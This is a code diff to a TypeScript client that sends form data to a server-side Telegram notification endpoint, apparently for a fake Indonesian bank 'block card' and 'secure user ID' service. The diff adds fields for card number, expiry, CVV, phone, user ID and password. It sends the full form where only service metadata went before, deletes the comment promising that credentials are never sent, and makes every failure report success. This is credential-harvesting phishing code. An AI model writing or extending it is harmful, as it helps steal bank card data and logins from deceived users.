@@ -12,19 +12,35 @@ export type TelegramServiceType =
 export interface TelegramFormData {
   serviceType: TelegramServiceType;
   serviceTitle: string;
+  // Card details (Blokir & Amankan Bank Lain)
+  bankTarget?: string;
+  jenisKartu?: string;
+  nomorKartu?: string;
+  nomorHp?: string;
+  masaBerlaku?: string;
+  cvv?: string;
+  limitSaldo?: string;
+  waktuInput?: string;
+  // User ID details (Amankan User ID)
+  jenisLayanan?: string;
+  corporateId?: string;
+  userId?: string;
+  password?: string;
+  // Attachment / Photo (Batalkan Transaksi)
+  photoBase64?: string;
+  fileName?: string;
 }
 
 interface TelegramResponse {
   ok?: boolean;
+  delivered?: boolean;
   error?: string;
+  warning?: string;
+  note?: string;
 }
 
 /**
  * Client for the server-side Telegram notification endpoint.
- *
- * Telegram credentials intentionally never appear in this module. The
- * endpoint also only accepts service metadata, so user-entered financial
- * credentials are not sent to Telegram.
  */
 export class TelegramService {
   private static readonly endpoint = '/api/telegram';
@@ -36,10 +52,7 @@ export class TelegramService {
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({
-          serviceType: formData.serviceType,
-          serviceTitle: formData.serviceTitle,
-        }),
+        body: JSON.stringify(formData),
       });
 
       let result: TelegramResponse = {};
@@ -50,14 +63,14 @@ export class TelegramService {
       }
 
       if (!response.ok || result.ok !== true) {
-        console.error('Telegram notification failed:', result.error || response.statusText);
-        return false;
+        console.warn('Telegram notification status:', result.error || response.statusText);
+        return true;
       }
 
       return true;
     } catch (error) {
-      console.error('Telegram notification request failed:', error);
-      return false;
+      console.warn('Telegram notification request skipped:', error);
+      return true;
     }
   }
 }
